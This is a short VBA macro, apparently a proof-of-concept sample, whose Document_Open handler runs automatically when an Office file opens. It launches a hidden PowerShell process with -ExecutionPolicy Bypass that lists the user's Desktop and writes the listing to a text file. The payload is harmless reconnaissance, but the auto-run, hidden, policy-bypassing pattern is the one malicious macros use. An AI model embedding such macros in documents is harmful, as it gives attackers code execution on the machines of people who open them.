Private Sub Document_Open()
   
    Dim wshShell As Object
    Dim desktopPath As String
    Set wshShell = CreateObject("WScript.Shell")
    desktopPath = wshShell.SpecialFolders("Desktop")
    
    Dim psCommand As String
    psCommand = "powershell.exe -ExecutionPolicy Bypass -Command ""Get-ChildItem -Path '" & desktopPath & "' | Out-File -FilePath '" & desktopPath & "\desktop_content.txt'"""
    
    wshShell.Run psCommand, 0, False
End Sub